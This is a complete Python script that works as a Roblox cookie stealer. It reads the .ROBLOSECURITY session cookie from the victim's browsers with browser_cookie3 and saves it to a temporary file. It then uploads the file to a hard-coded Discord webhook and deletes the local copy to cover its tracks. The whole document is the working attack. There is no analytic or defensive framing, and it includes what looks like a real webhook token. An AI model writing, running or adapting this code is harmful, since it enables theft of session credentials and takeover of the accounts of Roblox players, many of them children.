import os
import tempfile
import requests
import browser_cookie3

def cookieLogger():
    data = []  # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
    try:
        cookies = browser_cookie3.load(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    return None

cookies = cookieLogger()

if cookies is None or len(cookies) == 0:
    exit()

cookie_value = cookies[1]

# Save cookie value to a file in the temp directory
temp_dir = tempfile.gettempdir()
cookie_file = os.path.join(temp_dir, "roblox_cookie.txt")
with open(cookie_file, "w") as file:
    file.write(cookie_value)

# Send file to Discord webhook
webhook_url = "https://discord.com/api/webhooks/1114147797642530926/TF5pMW-SzquIDl7VOxiZ1ANXHTC0OsZ05mliHvhpV9DD8pR0sILlx--i31BlCYmLTM3L"
files = {"file": open(cookie_file, "rb")}
response = requests.post(webhook_url, files=files)

# Close the file
files["file"].close()

# Delete the cookie file
os.remove(cookie_file)
